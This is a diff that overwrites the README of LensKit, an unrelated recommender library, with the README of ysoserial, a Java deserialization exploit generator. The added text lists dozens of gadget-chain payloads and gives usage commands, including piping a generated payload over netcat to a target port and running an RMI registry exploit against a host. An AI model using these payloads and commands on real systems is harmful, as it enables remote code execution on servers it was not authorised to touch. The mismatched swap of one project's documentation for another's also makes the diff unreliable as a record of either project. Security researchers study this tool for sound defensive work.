@@ -1,124 +1,137 @@
-# LensKit
 
-[![Build Status](https://travis-ci.org/lenskit/lenskit.png?branch=master)](https://travis-ci.org/lenskit/lenskit)
-[![Windows build status](https://ci.appveyor.com/api/projects/status/github/lenskit/lenskit?branch=master)](https://ci.appveyor.com/project/elehack/lenskit)
-[![Test coverage](https://codecov.io/gh/lenskit/lenskit/branch/master/graph/badge.svg)](https://codecov.io/gh/lenskit/lenskit)
-[![SonarQube test coverage](https://sonarcloud.io/api/project_badges/measure?project=lenskit&metric=coverage)](https://sonarcloud.io/dashboard?id=lenskit)
-[![SonarQube technical debt](https://sonarcloud.io/api/project_badges/measure?project=lenskit&metric=sqale_index)](https://sonarcloud.io/dashboard?id=lenskit)
-[![Coverity Scan Build Status](https://img.shields.io/coverity/scan/9190.svg)](https://scan.coverity.com/projects/lenskit-lenskit)
-[![Join the chat at https://gitter.im/lenskit/lenskit](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/lenskit/lenskit?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
+# ysoserial
 
-**Deprecation Notice:** The Java implementation of LensKit is now deprecated.  For new projects, use the [Python version](https://lenskit.org).
+[![Join the chat at https://gitter.im/frohoff/ysoserial](
+    https://badges.gitter.im/frohoff/ysoserial.svg)](
+    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
+[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
+[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
-LensKit is an implementation of collaborative filtering algorithms and
-a set of tools for benchmarking them.  This readme is about working with
-the LensKit source code.  For more information about
-LensKit and its documentation, visit the [web site][] or [wiki][].  You 
-can also find information on the [wiki][] about how to use LensKit 
-without downloading the source code.  If this is your first time working
-with LensKit we recommend checking out the [Getting Started][] guide.
+A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
-[web site]: http://lenskit.org
-[wiki]: http://github.com/lenskit/lenskit/wiki/
-[Getting Started]: http://lenskit.org/documentation/basics/getting-started/
-[mailing list]: https://groups.google.com/forum/#!forum/lenskit-recsys
+![logo](ysoserial.png)
 
-LensKit is made available under the MIT license; see `LICENSE.md`.
+## Description
 
-## Installation and Dependency Management
+Originally released as part of AppSecCali 2015 Talk
+["Marshalling Pickles: how deserializing objects will ruin your day"](
+        https://frohoff.github.io/appseccali-marshalling-pickles/)
+with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
+Later updated to include additional gadget chains for
+[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.
 
-LensKit is built and deployed with [Gradle][] and publishes its
-artifacts to Maven Central.  To install it to the local Maven
-repository, making it available to other projects using standard
-Java-based tools, check out this repository and run `./gradlew
-install`; it is then available to other projects by depending directly
-on it in your Maven, Gradle, Ivy, or SBT project.  The source code can
-also be checked out and used in most Java IDEs.
+__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
+libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
+objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
+serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
+this data, the chain will automatically be invoked and cause the command to be executed on the application host.
 
-[Gradle]: http://gradle.org
+It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
+gadgets on the classpath.
 
-## Working with the Code
+## Disclaimer
 
-To work with the LensKit code, import the Gradle project into your IDE.
-Most modern Java IDEs include support for Gradle, including IntelliJ IDEA (used
-by most LensKit developers), Eclipse, and NetBeans.
+This software has been created purely for the purposes of academic research and
+for the development of effective defensive techniques, and is not intended to be
+used to attack systems except where explicitly authorized. Project maintainers
+are not responsible or liable for misuse of the software. Use responsibly.
 
-No other particular setup is needed.
+## Usage
 
-## Modules
+```shell
+$  java -jar ysoserial.jar
+Y SO SERIAL?
+Usage: java -jar ysoserial.jar [payload] '[command]'
+  Available payload types:
+     Payload             Authors                     Dependencies
+     -------             -------                     ------------
+     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
+     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
+     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
+     Clojure             @JackOfMostTrades           clojure:1.8.0
+     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsCollections1 @frohoff                    commons-collections:3.1
+     CommonsCollections2 @frohoff                    commons-collections4:4.0
+     CommonsCollections3 @frohoff                    commons-collections:3.1
+     CommonsCollections4 @frohoff                    commons-collections4:4.0
+     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
+     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
+     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
+     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1             @frohoff                    groovy:2.3.9
+     Hibernate1          @mbechler
+     Hibernate2          @mbechler
+     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRMPClient          @mbechler
+     JRMPListener        @mbechler
+     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21             @frohoff
+     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
+     MozillaRhino1       @matthias_kaiser            js:1.7R2
+     MozillaRhino2       @_tint0                     js:1.7R2
+     Myfaces1            @mbechler
+     Myfaces2            @mbechler
+     ROME                @mbechler                   rome:1.0
+     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     URLDNS              @gebl
+     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
+     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
+```
 
-LensKit is comprised of several modules.  The top-level `lenskit`
-module serves as a container to build them and provide common settings
-and dependencies.  The other modules are as follows:
+## Examples
 
-- `lenskit-api` -- the common, public recommender API exposed by LensKit, independent
-  of its actual implementations.
-- `lenskit-test` -- infrastructure and helper code for testing.
-- `lenskit-core` -- the core support code and configuration facilities for
-  the rest of LensKit. It is the entry point for most of what you want to do with
-  LensKit, providing support for configuring and building recommenders.
-- `lenskit-knn` -- k-NN recommenders (user-user and item-item collaborative
-  filtering).
-- `lenskit-svd` -- the FunkSVD recommender (and eventually real SVD recommenders).
-- `lenskit-slopeone` -- Slope-One recommenders.
-- `lenskit-eval` -- the evaluation framework and APIs, along with a command line
-  evaluation runner.
-- `lenskit-groovy` -- support for reading LensKit configurations from Groovy files.
-- `lenskit-all` -- a metapackage you can depend on to pull in the rest of the LensKit packages.
-- `lenskit-cli` -- the LensKit command line interface.
-- `lenskit-gradle` -- the Gradle plugin to script the LensKit evaluator
-- `lenskit-integration-tests` -- additional integration tests for LensKit.
+```shell
+$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
+0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
+0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
+0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
+...
+0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
+0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
+0000570: 0078 7071 007e 003a                      .xpq.~.:
 
-## Running the Tests
+$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+$ nc 10.10.10.10 1099 < groovypayload.bin
 
-After you make changes, it's good to run the unit tests.  You can run many of
-them from your IDE; run all tests in the `org.grouplens.lenskit` package (and
-subpackages) across all modules.
+$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+```
 
-To run the full test suite, including data-driven unit tests and integration
-tests, use Gradle:
+## Installation
 
-    $ ./gradlew check
+1. Download the latest jar from
+[JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
 
-## Copyright
+Note that GitHub-hosted releases were removed in compliance with the
+[GitHub Community Guidelines](
+    https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)
 
-LensKit is under the following copyright and license:
+## Building
 
-Copyright 2014-2017 [LensKit Contributors](CONTRIBUTORS.md).
-Copyright 2010-2014 Regents of the University of Minnesota
-Work on LensKit has been funded by the National Science Foundation under
-grants IIS 05-34939, 08-08692, 08-12148, and 10-17697.
+Requires Java 1.7+ and Maven 3.x+
 
-Permission is hereby granted, free of charge, to any person obtaining
-a copy of this software and associated documentation files (the
-"Software"), to deal in the Software without restriction, including
-without limitation the rights to use, copy, modify, merge, publish,
-distribute, sublicense, and/or sell copies of the Software, and to
-permit persons to whom the Software is furnished to do so, subject to
-the following conditions:
+```mvn clean package -DskipTests```
 
-The above copyright notice and this permission notice shall be
-included in all copies or substantial portions of the Software.
+## Code Status
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
-EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
-MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
-IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
-CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
-TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
-SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-  
-## Contributing to LensKit
-  
-We welcome contribution to LensKit.  If you are looking for something
-to work on, we recommend perusing the open tickets on GitHub
-or asking on the [mailing list][].
+[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
+[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
-We prefer to receive code submissions as GitHub pull requests.  To
-do this:
+## Contributing
 
-1. Fork the LensKit repository (`lenskit/lenskit`) on GitHub
-2. Push your changes to your fork
-3. Submit a pull request via the GitHub web interface
+1. Fork it
+2. Create your feature branch (`git checkout -b my-new-feature`)
+3. Commit your changes (`git commit -am 'Add some feature'`)
+4. Push to the branch (`git push origin my-new-feature`)
+5. Create new Pull Request
 
-For additional details, including legal maters, please see [CONTRIBUTING.md](CONTRIBUTING.md).
+## See Also
+* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
+* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
+* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
